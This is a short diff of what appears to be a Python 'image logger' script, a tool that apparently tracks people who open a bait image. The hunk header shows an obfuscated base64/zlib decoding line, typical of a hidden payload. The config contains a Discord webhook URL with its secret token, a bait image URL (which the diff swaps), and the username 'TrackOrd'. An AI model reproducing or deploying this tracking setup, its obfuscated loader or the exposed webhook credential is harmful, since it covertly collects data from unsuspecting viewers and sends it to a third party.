@@ -5,7 +5,7 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1434349276980445326/zg9LRNxjo7TF-KN-u2k-ih5T09hCzHxs-8exr5GjQbdKHAEKRzThbHCjSwu3UBSv97tl",
-    "image": "https://pkmncards.com/wp-content/uploads/charizard-ex-xy-promos-xy17-ptcgo-1.png",
+    "image": "https://play-lh.googleusercontent.com/wWPjmvVnXNY9ha1YHgVlqAv1F14aoRcRmGxYDTZa0R-RL7f6z7Q7svOHwLGF4MppRp8",
     "imageArgument": True,
     "username": "TrackOrd",
     "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true",
